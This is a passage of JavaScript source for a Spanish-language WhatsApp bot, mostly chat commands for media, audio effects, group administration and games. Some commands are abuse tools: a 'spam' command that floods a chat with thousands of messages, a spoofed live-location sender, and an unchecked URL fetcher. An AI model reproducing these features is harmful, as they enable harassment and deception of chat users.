"viewOnceMessage": {
"message": {
"imageMessage": {
"mimetype": 'image/jpeg',
"jpegThumbnail": dfrply,
"viewOnce": true
}
}
}
}, {}) 
cnf.relayWAMessage(res)
break

case 'pinterest':
				if (isBanned) return  reply(mess.banned)
                if (!isRegistered) return reply(ind.noregis())

if (!c) return reply('qué estás buscando?')
reply(mess.wait)


pinterest(`${c}`).then( data => {
const amsulah = data.result
const pimterest = amsulah[Math.floor(Math.random() * amsulah.length)]
sendMediaURL (from ,pimterest)
})
break
case 'isbaileys': 
case 'bail': 
case 'baileys':
				if (isBanned) return  reply(mess.banned)
                if (!isRegistered) return reply(ind.noregis())

reply(`${mek.quoted.isBaileys}`)
break
case 'getcaption':
				if (isBanned) return  reply(mess.banned)
                if (!isRegistered) return reply(ind.noregis())

try {
reply(`${mek.quoted.title}`)
} catch {
reply(`${mek.quoted.caption}`)
}
break
case 'q': 
				if (isBanned) return  reply(mess.banned)
                if (!isRegistered) return reply(ind.noregis())
    if (!m.quoted) return reply('Etiqueta!')
    let qse = cnf.serializeM(await m.getQuotedObj())
    if (!qse.quoted) return reply('el mensaje que respondió no contiene una respuesta!')
    await qse.quoted.copyNForward(m.chat, true)
break
case 'listgc':
case 'gclist':
case 'listgroup':
                case 'listgrup':
                case 'listgrop':
                case 'gruplist':
                case 'groplist':
                case 'grouplist':
                				if (isBanned) return  reply(mess.banned)
                if (!isRegistered) return reply(ind.noregis())
  const txs = cnf.chats.all().filter(v => v.jid.endsWith('g.us')).map(v =>`- ${cnf.getName(v.jid)}\n${v.jid}\n[${v.read_only ? 'Me sali xd' : 'Estoy dentro'}]`).join`\n\n`
  reply(txs)
  break
  case 'get':
case 'fetch':
				if (isBanned) return  reply(mess.banned)
                if (!isRegistered) return reply(ind.noregis())
            if(!c) return reply('Link?')
            fetch(`${args[0]}`).then(res => res.text())  
            .then(bu =>{
            reply(bu)
            })   
            break
            case 'autorespon':
            				if (isBanned) return  reply(mess.banned)
                if (!isRegistered) return reply(ind.noregis())
      if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
       if (args.length < 1) return reply(`Usa ${prefix}autorespon 1/0`)
           if (c === '0'){
                    reply(`Desactive con exito a Sim Simi`)
                    autorespon = true
                } else if (c === '1'){
              autorespon = false
                    reply(`La inteligencia artificial Sim Simi ah sido activada`)
                } else {
                    reply('Ocurrio un error')
                }
                break
                           
////////////////
                
        case 'test':
				case 'cek':
				case 'tes':				
				runtime = process.uptime()
				reply(`- Activo!\n${waktu(runtime)}`)
				break

case 'tictactoe':
case 'ttt':
				if (isBanned) return  reply(mess.banned)
                if (!isRegistered) return reply(ind.noregis())
if (!isGroup) return reply(mess.only.group)
if (args.length < 1) return reply('Etiqueta a tu oponente! ')
if (isTTT) return reply('Hay un juego en este grupo, espere')
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Etiqueta!')
ment = mek.message.extendedTextMessage.contextInfo.mentionedJid
er1 = sender
er2 = ment[0]
angka = ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]
id = from
gilir = er2
ky_ttt.push({er1,er2,id,angka,gilir})
cnf.sendMessage(from, `*🎳 Tictactoe 🎲*

[@${er2.split('@')[0]}] Te desafían a convertirte en un oponente del juego🔥
Escribe Y/N para aceptar o rechazar el juego.

Escribe ${prefix}delttc , Para reiniciar los juegos en el grupo!`, text, {contextInfo: {mentionedJid: [er2]}})
break
                case 'delttt':
                case 'delttc':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply(mess.only.group)
if (!isTTT) return reply('No hay juego en este grupo')
naa = ky_ttt.filter(toek => !toek.id.includes(from)) 
ky_ttt = naa 
reply('Listo')
break
case 'getscmd':
duda = fs.readFileSync('./sticker/menu.webp')
cnf.sendMessage(from, duda, sticker, {quoted: mek})
break
				case 'getpp':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
					anu = from
		if (`${anu}@s.whatsapp.net`) {
		try {
					ppimg = await cnf.getProfilePicture(anu)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				ano = await cnf.getProfilePicture(anu)
				buffer = await getBuffer(ano)
				cnf.sendMessage(from, buffer, image, {quoted: mek})
		} else {
		}
			  break
				case 'public':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
			publik = true
				reply('Cambio exitoso del modo self a public')
			break
			case 'self':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
			if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				publik = false
				reply('Éxito en cambiar el modo public a self')
			break
		case 'gimage':
case 'googleimage':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (args.length < 1) return reply('¿Qué quieres buscar?')
reply(mess.wait)


teks = args.join(' ')
res = await googleImage(teks, google)
function google(error, result){
if (error){ return reply('_[ ! ] Ocurre un error o no se encuentran resultados_')}
else {
var gugIm = result
var random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
sendFileFromUrl(random, image, {quoted: mek, caption: `*Resultados de búsqueda de :* ${teks}`})
}
}
break
				case 'google':
case 'googlesearch':
case 'ggs':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (args.length < 1) return reply('¿Qué estás buscando?')
teks = args.join(' ')
reply(mess.wait)


res = await ggs({'Resultado de' : `${teks}`})
kant = ``
for (let i of res) {
kant += `*Titulo* : ${i.title}
*Link* : ${i.link}
*Información* : ${i.snippet}`
}
var akhir = kant.trim()
reply(akhir)
break
case 'wiki':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (args.length < 1) return reply(' Qué buscar? ')
teks = args.join(' ')
res = await wikiSearch(teks).catch(e => {
return reply('_[ ! ] Resultado de error no encontrado') 
}) 
result = `*Titulo :* ${res[0].judul}
*Wiki :* ${res[0].wiki}`
sendFileFromUrl(res[0].thumb, image, {quoted: mek, caption: result}).catch(e => {
  reply(result)
})
break
case 'mediafire':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (args.length < 1) return reply('Link? ')
if(!isUrl(args[0]) && !args[0].includes('mediafire')) return reply(mess.error.api)
reply(mess.wait)


teks = args.join(' ')
res = await mediafireDl(teks)
result = `*Nombre :* ${res[0].nama}
*Peso :* ${res[0].size}

_Se está enviando el archivo. Espere unos minutos._`
reply(result)
sendFileFromUrl(res[0].link, document, {mimetype: res[0].mime, filename: res[0].nama, quoted: mek})
break

case 'lirik':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (args.length < 1) return reply('Titulo??')
reply(mess.wait)


teks = body.slice(7)
lirikLagu(teks).then((res) => {
let lirik = `${res[0].result}`
reply(lirik)
})
break


				case 'robot':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
encmedial = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
medial = await cnf.downloadAndSaveMediaMessage(encmedial)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${medial} -filter_complex "afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(medial)
if (err) return reply(mess.error.api)
hah = fs.readFileSync(ran)
cnf.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
break
case 'gemuk':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
					encmediaz = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediaz = await cnf.downloadAndSaveMediaMessage(encmediaz)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${mediaz} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(mediaz)
						if (err) return ephe('Error!')
						hah = fs.readFileSync(ran)
					cnf.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, duration: 359996400, quoted:mek})
						fs.unlinkSync(ran)
					})
					break
case 'balik':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
	encmediau = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	mediau = await cnf.downloadAndSaveMediaMessage(encmediau)
	ran = getRandom('.mp3')
	exec(`ffmpeg -i ${mediau} -filter_complex "areverse" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(mediau)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
cnf.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, duration: 359996400, quoted:mek})
fs.unlinkSync(ran)
	})
break
case 'bass':                 
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
					encmediao = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediao = await cnf.downloadAndSaveMediaMessage(encmediao)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${mediao} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(mediao)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						cnf.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, duration: 359996400, quoted:mek})
						fs.unlinkSync(ran)
					})
				break
case 'sider':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply(mess.only.group)
infom = await cnf.messageInfo(from, mek.message.extendedTextMessage.contextInfo.stanzaId)
tagg = []
teks = `Leído por :\n\n`
for(let i of infom.reads){
teks += '@' + i.jid.split('@')[0] + '\n'
teks += `Waktu : ` + moment(`${i.t}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') + '\n\n'
tagg.push(i.jid)
}
mentions(teks, tagg, true)
break

				case 'd':
				case 'del':
				case 'delete':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
					cnf.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
					break
				case 'colong':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
		if (!isQuotedSticker) return reply(`Etiqueta un sticker*`)
		const encmediia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	        const meidia = await cnf.downloadAndSaveMediaMessage(encmediia, `./sticker/${sender}`)
		    exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
		    if (error) return reply('error')
		    cnf.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), MessageType.sticker, {quoted: mek})
					fs.unlinkSync(meidia)
					fs.unlinkSync(`./sticker/takestick_${sender}.exif`)
				})
				break
				case 'readmore':
			    	case 'more':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
			    	const more = String.fromCharCode(8206)
			    	const readmore = more.repeat(4001)
				    if (!c.includes('|')) return  reply(mess.error.api)
                    const text1 = c.substring(0, c.indexOf('|') - 0)
                    const text2 = c.substring(c.lastIndexOf('|') + 1)
                    reply( text1 + readmore + text2)
                    break
                    case 'delchat':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
                    if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                reply('Eliminar chat con éxito' + from)
                await sleep(4000)
                cnf.modifyChat(from, ChatModification.delete)
                break
				case 'clearall':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					anu = await cnf.chats.all()
					cnf.setMaxListeners(10)
					for (let _ of anu) {
						cnf.deleteChat(_.jid)
					}
					reply('Todos los mensajes se borraron con éxito')
					break
					case 'mute':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
			    if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
			    if (!isGroup) return reply(mess.only.group)
                if (isMuted) return reply(`udah mute`)
                mute.push(from)
                fs.writeFileSync('./database/mute.json', JSON.stringify(mute))
                reply('El bot ha sido silenciado en este chat.')
                break
					case 'restart':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
__path = process.cwd()
reply(`_Reiniciando ${NombreBot}_`)
exec(`cd ${__path} && node index`)
sleep(4000)
reply('Listo')
break
				case 'detikvn':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
encmediam = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediam = await cnf.downloadAndSaveMediaMessage(encmediam)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(mediam)
						cnf.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:mek})
						fs.unlinkSync(mediam)
				break
				case 'detikvideo':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
				encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					median = await cnf.downloadAndSaveMediaMessage(encmedian)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(median)
						cnf.sendMessage(from, hah, video, {mimetype: 'video/mp4', duration: cokmatane, quoted: mek})
						fs.unlinkSync(median)
				break
				 case 'antilink':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
	        if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(mess.only.admin)
			if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (args.length < 1) return reply(`para activar usa : ${prefix}antilink 1`)
					if (Number(args[0]) === 1) {
						if (isAntiLink) return reply('Ya activa')
						antilink.push(from)
						fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
						reply('Activar con éxito la función antienlace')
					} else if (Number(args[0]) === 0) {
						if (!isAntiLink) return reply('Desactivada')
						var ini = antilink.indexOf(from)
						antilink.splice(ini, 1)
						fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
						reply('Desactivar con éxito la función antienlace')
					} else {
						reply('1 para encender, 0 para apagar')
					}
					break
				case 'tinyurl':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
try {
link = args[0]
anu = await axios.get(`https://tinyurl.com/api-create.php?url=${link}`)
reply(`${anu.data}`)
} catch (e) {
emror = String(e)
reply(`${e}`)
}
break
case 'sharelock':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
kntl = `${args.join(' ')}`
nama = kntl.split("|")[0];
impostor = kntl.split("|")[1];
cnf.sendMessage(from, {
name: nama,
address: impostor,
jpegThumbnail: ofrply}, MessageType.liveLocation, {quoted:floc})
break


/*case 'tts':
					if (args.length < 1) return cnf.sendMessage(from, `¿Cuál es el código de idioma? ejemplo : ${prefix}tts es Hola`, text, { quoted: mek })
				   const gtts = require('./lib/gtts')(args[0])
					if (args.length < 2) return cnf.sendMessage(from, `¿Dónde está el texto? ejemplo : ${prefix}tts es Hola`, text, { quoted: mek })
					var bby = body.slice(8)
					ranm = getRandom('.mp3')
					rano = getRandom('.ogg')
					bby.length > 300
						? reply('El texto es demasiado largo')
						: gtts.save(ranm, bby, function () {
							exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
								fs.unlinkSync(ranm)
								buff = fs.readFileSync(rano)
								if (err) return reply(dla.stikga())
								cnf.sendMessage(from, buff, audio, { duration: 359996400, ptt: true, quoted: mek })
								fs.unlinkSync(rano)
							})
						})
					break*/
				case 'demote':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
				if (!isGroup) return reply(mess.only.group)
				if (!isGroupAdmins) return reply(mess.only.admin)
                   if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Etiqueta!')
			demote = mek.message.extendedTextMessage.contextInfo.participant
		    cnf.groupDemoteAdmin(from, [demote])
						reply('Listo')
						break
					case 'promote':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
                   if (!isBotGroupAdmins) return reply(mess.only.Badmin)
				  if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Etiqueta!')
			promote = mek.message.extendedTextMessage.contextInfo.participant
		    cnf.groupMakeAdmin(from, [promote])
						reply('Listo')
						break
				case 'linkgrup':
				case 'linkgroup':
				case 'linkgc':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
				if (!isGroup) return reply(mess.only.group)
                   if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					linkgc = await cnf.groupInviteCode(from)
					yeh = `https://chat.whatsapp.com/${linkgc}\n\nLink de el grupo ${groupName}`
					cnf.sendMessage(from, yeh, text, { quoted: mek })
					break
				case 'welcome':		  
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (args.length < 1) return reply('Quien eres? 7-7')
					if (Number(args[0]) === 1) {
						if (isWelkom) return reply('Ya activo ')
						welkom.push(from)
						fs.writeFileSync('./database/welkom.json', JSON.stringify(welkom))
						reply('Activado✔️')
					} else if (Number(args[0]) === 0) {
						welkom.splice(from, 1)
						fs.writeFileSync('./database/welkom.json', JSON.stringify(welkom))
						reply('Desactivado✔️')
					} else {
						reply('1 para activar, 0 para desactivar')
					}                    
          break
					case 'resetlinkgc':
         case 'resetlinkgroup':
         case 'revoke':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
         if (!isGroup) return reply(mess.only.group)
         if (!isGroupAdmins) return reply(mess.only.admin)
                   if (!isBotGroupAdmins) return reply(mess.only.Badmin)
          json = ['action', 'inviteReset', from]
         cnf.query({json, expect200: true})
          reply('Restablecer con éxito el enlace de grupo')
         break
					case 'opengc':
				case 'abrir':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
                   if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                   reply(`Abriendo Grupo : ${groupName}`)
						cnf.groupSettingChange(from, GroupSettingChange.messageSend, false)
						break
						case 'closegc':
						case 'cerrar':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
						if (!isGroup) return reply(mess.only.group)
						if (!isGroupAdmins) return reply(mess.only.admin)
                   if (!isBotGroupAdmins) return reply(mess.only.Badmin)
						reply(`Cerrando grupo : ${groupName}`)
						cnf.groupSettingChange(from, GroupSettingChange.messageSend, true)
					break
				case 'spam':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					if (!arg) return reply(`Usa ${prefix}spam texto|Cantidad`)
				argzi = arg.split("|")
				if (!argzi) return reply(`Usa ${prefix}spam Texto|Cantidad`)
				if (Number(argzi[1]) >= 5000) return reply('Supera el limite!')
				if (isNaN(argzi[1])) return reply(`Tiene que ser un número`)
				for (let i = 0; i < argzi[1]; i++){
					cnf.sendMessage(from, argzi[0], MessageType.text)
				}
				break
				case 'demoteall':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
		if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
		if (!isGroup) return reply(mess.only.group)
		if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                members_id = []
		for (let mem of groupMembers) {
	   	members_id.push(mem.jid)
	  	}
                cnf.groupDemoteAdmin(from, members_id)
                break
                case 'promoteall':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
		if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
		if (!isGroup) return reply(mess.only.group)
		if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                members_id = []
		for (let mem of groupMembers) {
	   	members_id.push(mem.jid)
	  	}
                cnf.groupMakeAdmin(from, members_id)
                break
				case 'setnamegc':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
              if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					cnf.groupUpdateSubject(from, `${body.slice(11)}`)
					reply(`Éxito al cambiar el nombre del grupo a ${body.slice(11)}`)
					break					
				case 'setdeskgc':
				case 'setdescgc':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
                   if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					cnf.groupUpdateDescription(from, `${body.slice(10)}`)
					reply(`Se cambió correctamente la descripción del grupo a ${body.slice(10)}`)
					break
				case 'setprofile':
				case 'setpp':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
				cnf.updatePresence(from, Presence.composing)
				if (!isQuotedImage) return reply('Etiqueta una imagen!')
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					enmediau = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediau = await cnf.downloadAndSaveMediaMessage(enmediau)
					await cnf.updateProfilePicture(botNumber, mediau)
					reply('Listo')
					break
				case 'leave':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
				if (!isGroup) return reply(mess.only.group)
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				cnf.updatePresence(from, Presence.composing)
				cnf.groupLeave(from)
						break
				case 'bc':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
					cnf.updatePresence(from, Presence.composing)
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					if (args.length < 1) return reply('Y el texto?')
					anu = await cnf.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await cnf.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							cnf.sendMessage(_.jid, buff, image, { viewOnce:true, caption: `${body.slice(4)}`})
						}
						reply(`Éxito en la transmisión ${body.slice(4)}`)
						} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await cnf.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							cnf.sendMessage(_.jid, buff, video, { viewOnce:true, caption: `${body.slice(4)}`})
						}
						reply(`Éxito en la transmisión ${body.slice(4)}`)
						} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await cnf.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							cnf.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: finv, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: `${body.slice(4)}` })
						}
						reply(`Éxito en la transmisión ${body.slice(4)}`)
					} else {
						for (let _ of anu) {
							sendMess(_.jid, `${body.slice(4)}`)
						}
						reply(`Éxito de la transmisión:\n${body.slice(4)}`)
					}
					break
				case 'tomp4':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
					if (!isQuotedSticker) return reply('Etiqueta un sticker gif')
                                        reply(mess.wait)


            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            ger = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            owgi = await cnf.downloadAndSaveMediaMessage(ger)
            webp2mp4File(owgi).then(res=>{
            sendMediaURL(from,res.result)
            })
            }else {
            reply('Etiqueta un sticker gif!')
            }
            fs.unlinkSync(owgi)
            break
            case 'tomp3':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
					cnf.updatePresence(from, Presence.composing)
					if (!isQuotedVideo) return reply('Etiqueta un video')
					reply(mess.wait)


					encmediad = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					mediad = await cnf.downloadAndSaveMediaMessage(encmediad)
					ran = getRandom('.mp4')
					exec(`ffmpeg -i ${mediad} ${ran}`, (err) => {
						fs.unlinkSync(mediad)
						if (err) return reply(mess.error.api)
						mhee = fs.readFileSync(ran)
						cnf.sendMessage(from, mhee, audio, { mimetype: 'audio/mp4', duration: 359996400, quoted: mek })
						fs.unlinkSync(ran)
					})
					break
		    case 'slot':
            case 'slots':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
            const somtoy = sotoy[Math.floor(Math.random() * sotoy.length)]
            cnf.sendMessage(from, `[  🎰 | SLOTS ]\n-----------------\n🍋 : 🍌 : 🍍\n${somtoy} <=====\n🍋 : 🍌 : 🍍\n[  🎰 | SLOTS ]\n\nDescripción: si obtienes 3 de la misma fruta, significa que ganas\n\nEjemplo : 🍌 : 🍌 : 🍌 <=====`, MessageType.text, { quoted: mek })
            break
				case 'kontak':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
				if (!isGroup) return reply(mess.only.group)
					argzu = arg.split('|')
				if (!argzu) return reply(`Usa ${prefix}kontak @tag|nombre`)
				if (mek.message.extendedTextMessage != undefined){
                    mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					sendKontak(from, mentioned[0].split('@')[0], argzu[1])
				} else {
					sendKontak(from, argzu[0], argzu[1])
				}
				break
				case 'kontag':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
				if (!isGroup) return reply(mess.only.group)
				argzi = arg.split('|')
				if (!argzi) return reply(`Usa ${prefix}kontak @tag|nombre`)
				if (mek.message.extendedTextMessage != undefined){
                    		mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					hideTagKontak(from, mentioned[0].split('@')[0], argzi[1])
				} else {
					hideTagKontak(from, argzi[0], argzi[1])
				}
				break
				case 'getdeskgc':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
				if (!isGroup) return reply(mess.only.group)
				try {
					anu = from
			   metadete = await cnf.groupMetadata(anu)
				cnf.sendMessage(from, metadete.desc, text, {quoted:mek})
				 } catch (e) {
             reply(`No eh logrado proporcionar la descripción esto se puede deber a que no soy admin o el grupo no tiene una.`)
}
				  
				    break
					case 'getbio':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
	  var yy = mek.message.extendedTextMessage.contextInfo.participant
var p = await cnf.getStatus(`${yy}`, MessageType.text)
reply(p.status)
if (p.status == 401) {
reply(mess.error.api)
}
break
                    case 'getname':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
        var ambl = mek.message.extendedTextMessage.contextInfo.participant
const sname = cnf.contacts[ambl] != undefined ? cnf.contacts[ambl].notify = undefined ? PhoneNumber('+' + ambl.replace('@s.whatsapp.net', '')).getNumber('international') : cnf.contacts[ambl].notify || cnf.contacts[ambl].vname : PhoneNumber('+' + ambl.replace('@s.whatsapp.net', '')).getNumber('international')
reply(sname)
break
				case 'getpict':
				case 'getpic':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
					if (!isGroup) return reply(mess.only.group)
            mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
            pictt = await cnf.getProfilePicture(mentioned)
            pict = await getBuffer(pictt)
            cnf.sendMessage(from, pict, image, {quoted: mek})
            break
				case 'chat':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
			if (args.length < 1) return reply(`Usa ${prefix}chat 52###|texto`)
            var pc = body.slice(6)
            var nomor = pc.split("|")[0];
            var org = pc.split("|")[1];
            cnf.sendMessage(nomor+'@s.whatsapp.net', org, MessageType.text)   
            reply(`Enviar chat con éxito :\n${org}, @${nomor}`)
            break
				case 'attp':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
					if (!c) return reply(`¿Dónde está el texto?\nEjemplo :\n${prefix}attp Alcatraz`)
					atetepe = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURIComponent(c)}`)
					cnf.sendMessage(from, atetepe, sticker, { quoted: mek })
					break
				case 'semoji':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
			if (args === 0) return reply('Donde esta el emoji?')   
		   aku4 = args.join(' ')
           emoji.get(`${aku4}`).then(emoji => {
           link = `${emoji.images[10].url}`
		   sendWebp(from, `${link}`).catch(() => reply('Fallo'))
           })
    	   break
				case 'tag':
if (isBanned) return  reply(mess.banned)
